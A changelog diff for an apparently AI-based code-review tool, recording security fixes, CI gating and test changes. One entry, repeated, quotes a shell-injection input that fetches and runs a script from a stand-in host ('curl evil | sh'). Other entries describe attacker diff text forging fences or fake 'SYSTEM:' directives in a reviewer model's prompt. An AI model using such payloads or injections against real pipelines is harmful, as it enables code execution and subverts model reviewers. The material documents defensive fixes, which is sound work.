@@ -16,6 +16,14 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
   - Exits **3**, distinct from `evaluate_ci`'s 0/1, so a caller can tell "the reviewers disagreed with you" from "the reviewers never ran".
   - Tested on agents that are configured and available but return nothing — never a missing CLI, which is the case `--strict` already covers and which would pass whatever this change does. Four mutations fail: defaulting it on, dropping the flag guard, reusing exit 1, and counting reviews instead of vendors.
 
+- **The Review-Evidence Chain Is Wired Up** (#602): of the 16 PRs merged into `main` between 2026-08-19 and 2026-08-24, none carried a review verdict — including changes to the modules `tier3_globs` already lists as highest-risk.
+  - The cause was **not** the `gates: [build, lint]` line the issue pointed at: keel's own `projects/keel.yaml` declares exactly the same two. The gate is driven by a workflow, and this repo had none. Confirmed by running `keel evidence-verify` against a real PR here before writing anything — it works against the existing config unmodified, deriving a tier-2 two-reviewer requirement from `tier3_globs`.
+  - `.github/workflows/keel-ship.yml` is the consumer copy of keel's own, running `keel evidence-verify --phase pre-merge --require-armed` and publishing the verdict as the `keel evidence (required)` check-run.
+  - keel is installed **pinned**, and from `keel-workflow`. The PyPI name `keel` is an unrelated package at version 0.1; installing it would have given the job someone else's code and a failure that reads like a keel bug. A test asserts the package name as a rule over every install line — `keel-workflow` legitimately contains `keel`, so asserting the absence of a string would not have worked.
+  - **No jury requirement**, per the issue's recommendation. keel auto-enables a *gating* jury verdict at tier-3, and this repo's jury runs against real vendor APIs; a paid run per PR is not the cost posture, and a gate nobody can afford to satisfy is one that gets waived. It drops only that verdict — tier-3 still requires three distinct reviewer verdicts. A test pins the disarm as narrow: no `--reviewers` override, no `--jury-advisory`, no blanket deferral, no `--dry-run`.
+  - The gate reports but does not yet block: making the check *required* is a branch-protection change, which is an operator action. `.keel/project.yaml` now says so next to `gates:`, so the next reader does not re-derive this issue from an unexplained two-item list.
+  - **Two of the first mutations against the new tests passed, and that is why the tests changed shape.** Every flag asserted on is also *described* in a comment a few lines above it, so `assertIn("--require-armed", body)` held with the flag deleted; and `assertIn("issue_comment:", body)` matched `_disabled_issue_comment:`. The assertions are now line-anchored over comment-stripped text, with a guard asserting the stripping actually strips. Seven mutations — dropping `--require-armed`, `--phase`, the trigger, the gate call, the version pin, the package name, and colliding the job name with the check name — each fail.
+
 ### Changed
 - **`ruff-format` Rewrote 38 Files Under Anyone Who Installed The Hooks** (#621): `.pre-commit-config.yaml` declared `ruff-format` as a **rewriting** hook, pinned to `v0.4.4`, on a tree 35 files from formatted.
   - A contributor who installed the hooks and committed a one-line change got 38 unrelated files rewritten into it — silently, already staged by the time they looked. CI never noticed: it ran **no ruff step at all**, neither lint nor format.
@@ -25,39 +33,6 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
   - **Verified at the syntax-tree level, not by the suite passing.** All 36 changed Python files parse to byte-identical trees before and after: zero semantic differences. At this size "the tests passed" is weak evidence, since most of these files have no test that would notice a changed string.
   - Mutation-tested: drifting the hook version, dropping CI's pin, and removing either ruff step each fail.
 
-### Added
-- **The Review-Evidence Chain Is Wired Up** (#602): of the 16 PRs merged into `main` between 2026-08-19 and 2026-08-24, none carried a review verdict — including changes to the modules `tier3_globs` already lists as highest-risk.
-  - The cause was **not** the `gates: [build, lint]` line the issue pointed at: keel's own `projects/keel.yaml` declares exactly the same two. The gate is driven by a workflow, and this repo had none. Confirmed by running `keel evidence-verify` against a real PR here before writing anything — it works against the existing config unmodified, deriving a tier-2 two-reviewer requirement from `tier3_globs`.
-  - `.github/workflows/keel-ship.yml` is the consumer copy of keel's own, running `keel evidence-verify --phase pre-merge --require-armed` and publishing the verdict as the `keel evidence (required)` check-run.
-  - keel is installed **pinned**, and from `keel-workflow`. The PyPI name `keel` is an unrelated package at version 0.1; installing it would have given the job someone else's code and a failure that reads like a keel bug. A test asserts the package name as a rule over every install line — `keel-workflow` legitimately contains `keel`, so asserting the absence of a string would not have worked.
-  - **No jury requirement**, per the issue's recommendation. keel auto-enables a *gating* jury verdict at tier-3, and this repo's jury runs against real vendor APIs; a paid run per PR is not the cost posture, and a gate nobody can afford to satisfy is one that gets waived. It drops only that verdict — tier-3 still requires three distinct reviewer verdicts. A test pins the disarm as narrow: no `--reviewers` override, no `--jury-advisory`, no blanket deferral, no `--dry-run`.
-  - The gate reports but does not yet block: making the check *required* is a branch-protection change, which is an operator action. `.keel/project.yaml` now says so next to `gates:`, so the next reader does not re-derive this issue from an unexplained two-item list.
-  - **Two of the first mutations against the new tests passed, and that is why the tests changed shape.** Every flag asserted on is also *described* in a comment a few lines above it, so `assertIn("--require-armed", body)` held with the flag deleted; and `assertIn("issue_comment:", body)` matched `_disabled_issue_comment:`. The assertions are now line-anchored over comment-stripped text, with a guard asserting the stripping actually strips. Seven mutations — dropping `--require-armed`, `--phase`, the trigger, the gate call, the version pin, the package name, and colliding the job name with the check name — each fail.
-
-### Security
-
-- **Shell Injection via `inputs.version`** (#604):
-  - `action.yml`'s install step interpolated `${{ inputs.version }}` directly into its `run:` body. A GitHub expression is substituted textually before bash parses the line, so a caller passing `version: '1.0"; curl evil | sh; "'` executes arbitrary shell in the action's step. #584 moved `args`, the PR number and the base ref into `env:` for exactly this reason and left this one behind — the sweep it described in the plural was done in the singular.
-  - Now passed as `INPUT_VERSION` through `env:` like every other caller-supplied input.
-  - The guard is a rule over every step, not an assertion about one line: no `run:` body may contain a `${{ }}` expression, with a vacuity check so it cannot pass when there are no run bodies left, and a positive counterpart asserting each input still reaches the script through `env:`.
-
-- **`jury apply` Previews And Confirms Before It Writes** (#605): a destructive command no longer writes unannounced.
-  - `--dry-run` prints the paths each suggestion would touch and writes nothing.
-  - The preview is printed **before** any write, and comes from the same `git apply --check` probe the containment check uses — so it cannot disagree with what an apply would do, and it names a path the suggestion itself never claims (a rename target). Previously the per-suggestion output appeared *after* the write had happened.
-  - Applying now requires confirmation, or `--yes` for scripted use. When stdin is not a terminal and `--yes` was not passed, the command refuses rather than assuming consent — piping a report in is exactly the unattended case, and stdin may already be consumed by the report itself.
-  - The `index` argument no longer defaults to `all`. A bare `jury apply --report r.md` rewrote the working tree with every suggestion in the report; it now names the range and points at `--dry-run`.
-  - Independent of #603: any hand-rolled containment check is a bet that every way a patch can name a file was enumerated. This is what makes losing that bet survivable rather than silent.
-  - Found while building the preview: `parse_patch_suggestions` strips the fenced block's trailing newline, and git rejects a patch body whose last line is a header rather than content. A suggestion carrying a rename or mode section could not be read at all — the preview reported "nothing git could read" for a patch that was merely missing its terminator. The body is newline-terminated for both the probe and the apply, which are now guaranteed to see identical input.
-  - Every new test asserts against `git status --porcelain`, not just the exit code: the defect being fixed is precisely a command that reported one thing and wrote another.
-- **Patch Containment Now Asks Git Instead Of Reading Headers** (#603): `apply_patch_suggestion` derives the set of paths a patch would touch from `git apply --numstat -z --summary --check`, and refuses unless it is exactly the suggested file.
-  - The check added by #584 inspected only `--- `/`+++ ` header lines. Git carries filenames in several other constructs and honours all of them — `rename from`/`rename to`, `copy from`/`copy to`, `old mode`/`new mode`, and a `GIT binary patch` section that has no `---`/`+++` lines at all. A patch whose headers named the suggested file could rename an unrelated path and still return "Applied git patch to <file>". Reproduced against a throwaway repository.
-  - It failed because it was a **blocklist**: enumerate the dangerous header forms and reject them. Adding `rename from` to the same loop repeats the design and misses the next construct. Validation and application now go through the same parser, which closes the gap rather than narrowing it.
-  - `--numstat` reports a rename's destination but never its source, so a patch can remove a path no numstat record mentions. `rename` and `copy` are therefore refused as operations — a single-file suggestion has no business doing either — rather than having their paths re-derived from `--summary` prose. This is not belt-and-braces: a patch that deletes the target and then renames another file onto it is accepted by git, and numstat reports *only* the suggested file, twice. The path set matches exactly and the `--summary` line is the sole evidence the other file was destroyed.
-  - **Found while fixing this, one step earlier:** the diff detection was `startswith("---") or "@@" in fix`. A rename-only or binary-only body has neither, so it never reached the git branch at all — it fell through to the line-replacement path, which wrote the diff *text* into the target file and reported success. Anything git can read as a patch now reaches the branch where containment is decided.
-  - The previous test passed for the wrong reason: the secondary target did not exist in the fixture, so `git apply` failed on its own and the assertion landed on the error string — removing the guard entirely left it green. Every new fixture creates the secondary target, so the patch would otherwise apply cleanly.
-  - Reachable only via `jury apply` run locally against a report derived from an untrusted diff; `action.yml` does not invoke it.
-
-### Changed
 - **#600 Withdrawn: The `workspace-write` Sandbox Bypass Never Existed** (#608): shipped as `[HIGH]` security, reclassified as a docs/wording change.
   - The claim was that `_DANGEROUS_FLAGS` omitting `workspace-write` let a Codex reviewer configured with `-s workspace-write` escape all warnings and `--strict`. Measured at the fix commit and its parent, that spec produces **exactly one warning either way** — only the wording differs. `audit_agent` warns for any non-claude agent not under a *restricting* sandbox, and that catch-all had been in the file since `f5797cf` (2026-06-07), two and a half months earlier. `--strict` promotes any warning to a failure, so the configuration already failed. There was nothing to escape.
   - What #600 actually did was replace a generic "no recognized sandbox" message with one naming `workspace-write` and the powers it grants — worth doing, and not a security fix. The release history never carried the `[HIGH]`: #600 touched no changelog. The only record was `.jules/sentinel.md`, which is where the correction goes.
@@ -65,6 +40,12 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
   - `docs/live-review-report.md` is annotated at all three assertions rather than edited: how four independent passes converged on the same wrong reading is the part worth keeping.
 
 ### Fixed
+- **Duplicate Changelog Sections Shipped Into The Release Notes** (#627): `## [Unreleased]` carried `### Added` and `### Changed` twice each, and `## [1.0.0]` repeats `Changed` and `Fixed` in released history.
+  - Nothing was lost — each entry was inserted above the previous top section, so the document grew alternating headings. `## [Unreleased]` becomes `## [x.y.z]` verbatim at release, so the duplication would have shipped to PyPI's description and the GitHub Release notes, where a reader looking for "what changed" finds two lists of the same kind.
+  - Consolidated across every version block. The entry count is identical before and after (216 lines beginning `- `), which is the check that separates a merge from a deletion.
+  - `tests/test_changelog_sections.py` asserts no version repeats a section, that headings come from a known vocabulary — `### Fixes` is silently a different bucket from `### Fixed` — and that `Unreleased` is non-empty, since a release cut from an empty block is blank.
+  - The vocabulary is a fixed list, not one derived from the file, which would pass by construction. It covers Keep a Changelog's six plus the three this project uses (`Documentation`, `Performance`, `Internal`); the first draft omitted those and would have imposed a vocabulary the project never adopted.
+  - Mutation-tested: repeating a section, misspelling `Fixed` as `Fixes`, and emptying `Unreleased` each fail.
 - **A ReDoS Test That Measured Machine Load** (#614): `test_no_redos_on_long_key_like_input` asserted a 3-second wall-clock ceiling on one input size. It failed whenever the suite ran under `coverage` — which is how CI and the pre-push check run it — for reasons unrelated to the code.
   - The number it asserted on was dominated by scheduler noise, not input size: measured on a loaded machine, 200 000 characters came out *faster* than 50 000. A non-monotonic series is not measuring the thing it names.
   - It also could not catch what it claimed to. A ceiling on a single size cannot distinguish quadratic from linear-but-slow; a blowup appearing below the tested size would have passed.
@@ -87,6 +68,28 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
   - `patches.py`'s `Cannot read` / `Cannot write` arms and `cli.py`'s report-read arm were added by #588 and covered by no test — nothing in the repository referenced any of the three messages, and the 98% coverage floor had room for three uncovered branches.
   - #588's body said "Added regression tests in `test_cli_contract.py` and `test_patches_apply.py`". Literally true — one test in each — but between them they covered two of five new branches, and the one placed in `test_patches_apply.py` exercised `cli.py`'s `_run_apply` rather than `patches.py`, so the filename made the untested bullet above it look guarded.
   - Each branch now has a case built from a real failure shape (undecodable bytes, a read-only file), plus one asserting a refused apply leaves the file byte-identical.
+
+### Security
+- **Shell Injection via `inputs.version`** (#604):
+  - `action.yml`'s install step interpolated `${{ inputs.version }}` directly into its `run:` body. A GitHub expression is substituted textually before bash parses the line, so a caller passing `version: '1.0"; curl evil | sh; "'` executes arbitrary shell in the action's step. #584 moved `args`, the PR number and the base ref into `env:` for exactly this reason and left this one behind — the sweep it described in the plural was done in the singular.
+  - Now passed as `INPUT_VERSION` through `env:` like every other caller-supplied input.
+  - The guard is a rule over every step, not an assertion about one line: no `run:` body may contain a `${{ }}` expression, with a vacuity check so it cannot pass when there are no run bodies left, and a positive counterpart asserting each input still reaches the script through `env:`.
+
+- **`jury apply` Previews And Confirms Before It Writes** (#605): a destructive command no longer writes unannounced.
+  - `--dry-run` prints the paths each suggestion would touch and writes nothing.
+  - The preview is printed **before** any write, and comes from the same `git apply --check` probe the containment check uses — so it cannot disagree with what an apply would do, and it names a path the suggestion itself never claims (a rename target). Previously the per-suggestion output appeared *after* the write had happened.
+  - Applying now requires confirmation, or `--yes` for scripted use. When stdin is not a terminal and `--yes` was not passed, the command refuses rather than assuming consent — piping a report in is exactly the unattended case, and stdin may already be consumed by the report itself.
+  - The `index` argument no longer defaults to `all`. A bare `jury apply --report r.md` rewrote the working tree with every suggestion in the report; it now names the range and points at `--dry-run`.
+  - Independent of #603: any hand-rolled containment check is a bet that every way a patch can name a file was enumerated. This is what makes losing that bet survivable rather than silent.
+  - Found while building the preview: `parse_patch_suggestions` strips the fenced block's trailing newline, and git rejects a patch body whose last line is a header rather than content. A suggestion carrying a rename or mode section could not be read at all — the preview reported "nothing git could read" for a patch that was merely missing its terminator. The body is newline-terminated for both the probe and the apply, which are now guaranteed to see identical input.
+  - Every new test asserts against `git status --porcelain`, not just the exit code: the defect being fixed is precisely a command that reported one thing and wrote another.
+- **Patch Containment Now Asks Git Instead Of Reading Headers** (#603): `apply_patch_suggestion` derives the set of paths a patch would touch from `git apply --numstat -z --summary --check`, and refuses unless it is exactly the suggested file.
+  - The check added by #584 inspected only `--- `/`+++ ` header lines. Git carries filenames in several other constructs and honours all of them — `rename from`/`rename to`, `copy from`/`copy to`, `old mode`/`new mode`, and a `GIT binary patch` section that has no `---`/`+++` lines at all. A patch whose headers named the suggested file could rename an unrelated path and still return "Applied git patch to <file>". Reproduced against a throwaway repository.
+  - It failed because it was a **blocklist**: enumerate the dangerous header forms and reject them. Adding `rename from` to the same loop repeats the design and misses the next construct. Validation and application now go through the same parser, which closes the gap rather than narrowing it.
+  - `--numstat` reports a rename's destination but never its source, so a patch can remove a path no numstat record mentions. `rename` and `copy` are therefore refused as operations — a single-file suggestion has no business doing either — rather than having their paths re-derived from `--summary` prose. This is not belt-and-braces: a patch that deletes the target and then renames another file onto it is accepted by git, and numstat reports *only* the suggested file, twice. The path set matches exactly and the `--summary` line is the sole evidence the other file was destroyed.
+  - **Found while fixing this, one step earlier:** the diff detection was `startswith("---") or "@@" in fix`. A rename-only or binary-only body has neither, so it never reached the git branch at all — it fell through to the line-replacement path, which wrote the diff *text* into the target file and reported success. Anything git can read as a patch now reaches the branch where containment is decided.
+  - The previous test passed for the wrong reason: the secondary target did not exist in the fixture, so `git apply` failed on its own and the assertion landed on the error string — removing the guard entirely left it green. Every new fixture creates the secondary target, so the patch would otherwise apply cleanly.
+  - Reachable only via `jury apply` run locally against a report derived from an untrusted diff; `action.yml` does not invoke it.
 
 ## [1.14.4] - 2026-08-19
 
@@ -172,7 +175,6 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
 ## [1.12.0] - 2026-08-06
 
 ### Added
-
 - **Universal Agent Provider Support** (#478, #479, #480, #481, #482, #483, #484):
   - **`GenericOpenAICompatibleAdapter`**: Hosted HTTP API reviewer for **OpenRouter**, **DeepSeek**, **Groq**, **Mistral**, **LiteLLM**, **Azure OpenAI**, etc. (`vendor = "openai-compatible"`, with custom `endpoint`, `api_key_env`, and `headers`). Supports polymorphic plain string and array message payload parsing.
   - **`GenericCLIAdapter`**: Integration for arbitrary coding-agent CLIs (`vendor = "cli"`, e.g. Aider, Goose, OpenHands) with `prompt_mode = "stdin"` or `"arg"`, automatic secret redaction (`redaction.redact`), and exit-code error classification (`classify_stderr`).
@@ -184,7 +186,6 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
 ## [1.11.1] - 2026-07-27
 
 ### Fixed
-
 - **`jury --doctor` no longer leaks a stack trace on malformed TOML** (#464): an invalid
   `jury.toml` surfaced the raw `TOMLDecodeError` traceback instead of the redacted
   config-error warning every other load failure produces. The decode error is now wrapped in
@@ -197,14 +198,12 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
   deep-linked heading is not hidden behind the sticky site header.
 
 ### Changed
-
 - **Faster diff-profile path handling** (#455): the per-path loops in `diffprofile` fold
   into a single pass, avoiding repeated scans over the changed-file list.
 
 ## [1.11.0] - 2026-07-17
 
 ### Added
-
 - **`jury replay <outcome.json>`**: re-watch a finished run in the deliberation theater
   with no orchestration, network, or agents. Loads a serialized outcome (bare
   `outcome_to_dict` dump or a result-cache entry) and re-drives the theater with the exact
@@ -223,14 +222,12 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
   categorical rule instead of a numeric trust weight. (#442)
 
 ### Fixed
-
 - `jury --doctor` no longer crashes on an oversized/invalid config: `ConfigError` is caught
   and surfaced as a redacted warning like every other config-loading failure. (#441)
 
 ## [1.10.0] - 2026-07-11
 
 ### Added
-
 - **Google (Gemini) hosted-API adapter** (`vendor = "google-api"`): completes the
   three-vendor hosted-API set alongside `anthropic-api`/`openai-api` — a reviewer
   keyed by just `GEMINI_API_KEY`, no `agy` CLI install or interactive login needed.
@@ -250,7 +247,6 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
 ## [1.9.8] - 2026-07-06
 
 ### Security
-
 - **Scoped `gh` output redaction to error/log paths only.** Failed-`gh` error
   messages now redact **stdout as well as stderr**, and the
   `post_inline_comments` **dry-run payload dump is redacted before it is
@@ -265,7 +261,6 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
 ## [1.9.7] - 2026-07-03
 
 ### Security
-
 - Exception strings from failed agent spawns, version probes, local-model
   requests, config loading, and live-post steps are now **redacted before
   being wrapped into error/warning messages** — closing the same secret-leak
@@ -277,7 +272,6 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
   now redacted too.
 
 ### Changed
-
 - The website's **"Run review" demo button is now disabled (with an
   explanatory `title`) when zero reviewers are selected**, instead of staying
   clickable and only showing an inline note after the fact.
@@ -288,13 +282,11 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
 ## [1.9.6] - 2026-06-21
 
 ### Security
-
 - `gh` CLI subprocess stderr is now **redacted before being wrapped into a
   `RuntimeError`**, so secrets (e.g. `ghp_` GitHub tokens) echoed by a failing
   `gh` call can no longer leak into logs, tracebacks, or CI output.
 
 ### Changed
-
 - The website **theme-toggle button now announces the action it will perform**
   ("Switch to light theme" / "Switch to dark theme") via a dynamic `aria-label`
   and `title`, kept in sync with the active theme through a `MutationObserver`
@@ -306,7 +298,6 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
 ## [1.9.5] - 2026-06-15
 
 ### Fixed
-
 - Theater is now readable on **light-background terminals**. The chrome (title,
   meta, phase strip, separators, transcript, speech bubble) hardcoded white/grey
   foregrounds that vanished on a light theme; it now uses the terminal's default
@@ -314,7 +305,6 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
   pixel scene (own dark background) and vendor/verdict colours are unchanged.
 
 ### Changed
-
 - Website analytics switched from Google Analytics 4 to **Cloudflare Web
   Analytics** — cookieless and privacy-first, so no cookie-consent banner is
   required (GDPR / ePrivacy / PECR). The CLI still sends no telemetry.
@@ -322,14 +312,12 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
 ## [1.9.4] - 2026-06-15
 
 ### Fixed
-
 - Theater decision banner no longer shows a **doubled ellipsis** ("x… …") when a
   verdict overflows 3 lines; the last line is plain-sliced with a single "…".
 
 ## [1.9.3] - 2026-06-14
 
 ### Fixed
-
 - **The decision banner now wraps the full verdict** across up to 3 lines on the
   table (ellipsis only if it's still longer), instead of truncating the whole
   verdict to one line — so the rationale is readable in the scene itself (flat +
@@ -340,14 +328,12 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
   rationale lives on the banner, so the transcript no longer ends in an ellipsis.
 
 ### Internal
-
 - `theater.py` is now at 100% coverage (covered the ticker, `_fit`/`_wrap_banner`,
   and the verdict-headline branches); overall coverage nudged off the 99% floor.
 
 ## [1.9.2] - 2026-06-14
 
 ### Fixed
-
 - **Theater clock is now live.** The scene only repainted on each `on_event`, so
   between phases (while agents run, often tens of seconds) it froze and the timer
   jumped in bursts. A background ticker now repaints on an interval so the clock
@@ -361,7 +347,6 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
 ## [1.9.1] - 2026-06-14
 
 ### Security
-
 - **Theater scrubs control / bidi / zero-width characters from terminal output**
   (`docs/security-audit-2026-06-14-theater.md`). The `--theater` scene rendered
   agent-influenced text (finding claims, the verdict line) to the terminal
@@ -373,7 +358,6 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
   argument. No Critical/High/Medium remaining after re-audit.
 
 ### Fixed
-
 - Website demo: changing the panel/depth now fully **resets the animated
   theater** (the scene is hidden and cleared) so the next run replays from
   scratch with no stale seats, phase marks, or decision banner.
@@ -381,7 +365,6 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
 ## [1.9.0] - 2026-06-14
 
 ### Added
-
 - **Default the theater view from `jury.toml`** (issue #364): `[jury] theater =
   true` and `theater_style = "flat"|"pixel"` so the animated deliberation view
   can be on by default. New CLI flags `--no-theater` and a config-aware
@@ -390,7 +373,6 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
   `pixel` to `flat`, when unsupported).
 
 ### Documentation
-
 - Landing page + `docs/comparison.md`: new comparison row — **animated
   deliberation view (in-terminal)**, an ai-jury-only capability.
 - Website demo: the scripted "Run review" now plays an in-browser animated
@@ -399,7 +381,6 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
 ## [1.8.1] - 2026-06-14
 
 ### Fixed
-
 - **`--theater` crashed on a real interactive terminal** with
   `TypeError: resolve_chair() missing 3 required positional arguments`. The
   scene's chair label called the run-time `resolve_chair` with the wrong
@@ -411,7 +392,6 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
 ## [1.8.0] - 2026-06-14
 
 ### Added
-
 - **`--theater-style {flat,pixel}`: a pixel-art style for the theater scene.**
   The same live deliberation (same `on_event` flow) rendered as a top-down
   **pixel-art room** — little chibi jurors (hair + eyes + vendor-coloured torso)
@@ -422,12 +402,10 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
   `flat` ANSI scene. Pure stdlib. See `docs/theater-design.md`.
 
 ### Changed
-
 - `--theater` help text now describes the **deliberation** framing (no
   "courtroom"/"gavel") to match the round-table scene.
 
 ### Documentation
-
 - README, `docs/theater-design.md`, and the landing page document both theater
   styles (flat + pixel) with refreshed demos rendered from the real renderer.
 - Site: the demo's `jury.toml` preview now grows to fill the controls column and
@@ -436,7 +414,6 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
 ## [1.7.0] - 2026-06-14
 
 ### Added
-
 - **`--theater`: an animated "deliberation" view of a live run.** Opt-in,
   presentation-only: the models sit around a table and take turns speaking as
   the run moves through review → debate → verify → decision, then decide together
@@ -453,7 +430,6 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
   colour.
 
 ### Documentation
-
 - README, `docs/theater-design.md`, and the landing page gained a dedicated
   **Theater mode** section with a pixel-art deliberation demo gif.
 
@@ -469,7 +445,6 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
 > Also ships the earlier website/UX and performance tweaks. No breaking changes.
 
 ### Security
-
 - **Ninth security re-audit** (`docs/security-audit-2026-06-13-round9.md`). A
   determined final red-team of the verdict-attach layer + an independent
   convergence pass (which confirmed no new Medium+ and recommended release); no
@@ -617,7 +592,6 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
     per-regex matching and free of catastrophic backtracking.
 
 ### Changed
-
 - Website demo "Run review" button now shows "Running review..." while a run is
   in progress, making the loading state explicit.
 - Added an `aria-label` to the install-command copy button so screen readers
@@ -632,11 +606,9 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
 > repository-quality work. No breaking changes.
 
 ### Security
-
 - **Post-v1.6.0 security re-audit** (`docs/security-audit-2026-06-07-v1.6.0.md`). A sixth re-audit — four independent surface reviews (subprocess/sandbox, network/SSRF, prompt-injection/redaction, filesystem/cache + classification) with the key claims confirmed empirically — verifies every #287–#322 fix holds in the released v1.6.0 source. It is the **first round with no Critical, High, *or* Medium finding**: prompt-injection coverage is now complete (the M-1 verdicts slot is fenced + neutralized), least privilege and SSRF are fail-closed, and cache integrity holds under tamper/forgery. Only optional, non-attacker-reachable defense-in-depth notes remain (scheme-less `redact_url_userinfo` early-return, no hard diff byte cap, `LocalAdapter` runtime SSRF gate, unknown-vendor flag retention, string-based loopback allow-list). The superseded intermediate Claude reports are removed; their history lives in this changelog.
 
 ### Changed
-
 - Improved report/rendering performance by reducing repeated list-extension and string-join work in report assembly.
 - Combined security keyword classification regexes so repeated classification passes do less redundant matching.
 - Improved website accessibility with semantic form grouping, visible keyboard focus states, and clearer disabled-button styling.
@@ -651,7 +623,6 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
 > nested redaction) are fixed.
 
 ### Security
-
 - **Synthesis verdicts addendum is now fenced + neutralized** (#321, completes #316/L-1). The `VERIFICATION VERDICTS` block appended to the synthesis prompt was the one untrusted slot left un-fenced and un-neutralized — a verdict's `claim`/`reasoning` transitively quote attacker diff text, so it could forge a fence closer or a fake `SYSTEM:` directive in the chair's prompt. It is now wrapped in an `UNTRUSTED_FINDINGS` fence and run through `neutralize_sentinels`, matching every other untrusted slot. (The CI gate stays consensus-derived, so this only ever affected the human-facing synthesis text.)
 - **Re-audit low-severity bundle** (#322). The init-endpoint credential display now strips userinfo **structurally** via a shared `redaction.redact_url_userinfo` helper (used by `jury init` and `doctor`), so a short (<6-char) password or a colon-less bare token — which the `basic_auth` regex missed — can no longer leak to stdout/CI logs; `redact()` also gains a colon-less userinfo arm and a lower password bound for the diff-scrub path (L-1, residual of #316/L-7). The `vulnerab`/`exploit` classification keyword stems are now compiled with a trailing `\w*` instead of `\b…\b`, so `vulnerability`/`exploitable`/`exploited` are correctly recognized as security-sensitive (L-2). Redaction no longer re-redacts an already-emitted `[REDACTED:…]` marker, so a secret inside a basic-auth URL keeps its informative kind and an accurate count (L-3).
 - **Post-v1.5.0 security re-audit** (`docs/security-audit-2026-06-07-v1.5.0.md`). A fifth four-surface re-audit confirmed every #287–#316 fix holds in source (no Critical/High; filesystem/cache surface fully clean) and surfaced one Medium (the un-fenced verdicts slot) plus three Lows — **all fixed in this release (#321, #322).**
@@ -664,7 +635,6 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
 > token formats.
 
 ### Security
-
 - **`injection.scan` is now O(N), not O(N²)** (#314). It recomputed each hit's line via `text.count(...)` (O(index)) and emitted one hit per matched char, so a long run of zero-width characters cost quadratic time — 200k zero-width chars ≈ 6.6 s, a CPU-exhaustion DoS since `scan_inputs` runs on the full per-chunk diff before fan-out. Now newline offsets are computed once and the line is found by binary search, and hits are capped per kind; 200k ≈ 86 ms, linear.
 - **Config validation returns a clean error on a malformed endpoint** (#315, completes #309). `config._endpoint_issues` called `urlsplit` unguarded, which raises `ValueError` on a malformed URL (`http://[::1`), so `validate_config` crashed with a stack trace instead of a `ConfigError`. The `urlsplit`/hostname access is now guarded; a non-UTF-8 config/policy file is likewise a clean `ConfigError`/`PolicyError`.
 - **Re-audit low-severity bundle** (#316). The prior-round debate addendum (`prior_txt`) is now fenced and run through `neutralize_sentinels` like every other untrusted slot (L-1). Redaction adds SendGrid / PyPI / npm tokens and Slack webhook URLs (L-2). `cache clear()` only touches files matching the 64-hex cache-name shape, so it can't delete unrelated files in a shared `JURY_CACHE_DIR` (L-3). Cache entries are written via `tempfile.mkstemp` (O_EXCL, no symlink-follow) instead of a predictable pid-tagged temp (L-4). Config/policy TOML reads are size-capped at 4 MiB (L-5). The privilege audit recognizes the `=`-form sandbox (`-s=`/`--sandbox=`) the enforcement already accepts, so a safe config no longer false-positives under `--strict` (L-6). The `jury init --local-endpoint` value is redacted before being echoed to stdout (L-7).
@@ -676,7 +646,6 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
 > each cross-vendor jury-reviewed. No config/flag changes.
 
 ### Security
-
 - **The read-only sandbox is now fail-closed for an unknown vendor** (#310, completes #300). #300 made the audit *warn* for an unsandboxed non-claude reviewer, but `privilege.enforce_read_only` still injected **no** sandbox for an unknown vendor, so in default (non-strict) mode it ran fail-open. An unknown vendor routes to the generic `AgyAdapter`, so it now gets `--sandbox` injected like agy — an agy-compatible CLI runs sandboxed, an incompatible one fails on the flag rather than running unsandboxed. `local` (network) agents stay out of scope.
 - **`jury init --local-endpoint` is gated by the SSRF endpoint validation** (#309). The config-file path was validated by `_endpoint_issues`, but the `init --list-models`/`--list-agents` discovery path called `list_local_models()` directly, so it could GET an arbitrary host. The gate now lives inside `list_local_models` itself, so **every** caller is covered: a non-`http(s)` scheme or a non-loopback host (without `JURY_ALLOW_REMOTE_ENDPOINT`) returns `[]` with no network call.
 - **Post-v1.4.0 security re-audit** (`docs/security-audit-2026-06-07-v1.4.0.md`). A third four-surface re-audit of the released code confirms every #287–#303 fix holds in source (no Critical/High). It surfaces two **Medium** residuals — the unknown-vendor adapter path still runs **fail-open** (no sandbox injected) in default mode even though #300 made the audit warn, and `jury init --local-endpoint` reaches an arbitrary host **without** the `_endpoint_issues` SSRF gate the config path enforces. **Both Mediums are fixed in this release (#310, #309).** The minor items it noted (init endpoint not redacted in stdout, explicit TLS context, `prior_txt` debate slot not neutralized, more secret formats, `cache clear()` glob blast-radius, atomic-write temp via `mkstemp`) remain tracked for follow-up.
